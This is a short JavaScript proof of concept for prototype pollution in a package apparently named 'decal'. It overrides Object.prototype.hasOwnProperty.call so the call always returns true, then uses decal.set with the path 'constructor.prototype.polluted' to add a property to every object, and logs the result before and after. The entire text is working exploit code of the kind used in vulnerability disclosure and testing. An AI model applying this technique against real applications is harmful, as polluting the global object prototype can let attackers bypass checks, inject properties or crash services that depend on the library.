Object.prototype.hasOwnProperty.call = () => true;
const decal = require('decal');
console.log({}.polluted);
decal.set({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);